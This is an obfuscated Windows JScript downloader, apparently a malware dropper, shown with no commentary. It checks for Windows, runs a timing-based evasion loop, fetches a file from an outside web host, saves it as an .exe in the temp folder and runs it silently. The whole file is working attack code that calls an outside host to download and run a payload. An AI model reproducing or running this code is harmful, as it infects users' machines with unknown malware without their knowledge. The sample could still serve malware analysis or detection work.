var x0 = false;
var RF = "CreateObject";
var tI = function Oj() {return WScript[RF]("WScript.Shell");}(), Hc = 11;
var c = "MSXML2.XMLHTTP";
var yG = 2123213;
var yy = 0;
function q(Av){tI["Run"](Av, yy, yy);};
function Xk(){return "" + c;};
function H(gu, Sh){yy = yy * 1; return gu - Sh;};
function DA(){return RF;};
/*@cc_on
  @if (@_win32 || @_win64)
    x0 = true;
  @end
@*/
if (x0)
{
var ng = "";
function Sn(){return 22;};
var mF = 0; var W = 0;
function Df()
{
var hH = new this["Date"]();
var x = hH["getUTCMilliseconds"]();
WScript["Sleep"](Sn());
var hH = new this["Date"]();
var P = hH["getUTCMilliseconds"]();
WScript["Sleep"](Sn());
var hH = new this["Date"]();
var dl = hH["getUTCMilliseconds"]();
var mF = "Q";
mF = H(P, x);
var W = "V";
W = H(dl, P);
ng = "open";
return H(mF, W);
}
var BT = false;
var He = false;
for (var qS = yy; qS < Sn() * 1; qS++){if (Df() != yy){
BT = true; 
W = "31" + 11 * mF + W; 
He = true; 
break;
}}
function bj() {return ((BT == true) && (BT == He)) ? 1 : yy;};
if (BT && bj() && He){
function hn() {return tI["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "fmyz0GGeR.exe";};
 UP = Xk();
 AU = WScript[RF](UP);
 var kt = 1;
 while (kt){
try {
AU[ng]("GET", "http://pasticceriabonci.it/m1psa", false);
AU["send"]();
I = "Sleep";
for (;;){WScript[I](Sn() * 11); if (AU["readystate"] >= 2 * 2) break;};
kt = yy;
} catch(z){};
}
function Z(Mb) {var KF = (1, 2, 3, 4, 5, Mb); return KF;};
L = WScript[DA()]("ADODB.Stream");
UP = L;
UP[ng]();
UP["type"] = Z(1);
UP["write"](AU["ResponseBody"]);
L["position"] = Z(yy);
UP["Save" + "ToFile"](hn(), 2);
L["c"+"lose"]();
t = hn();
q(t);
}
}

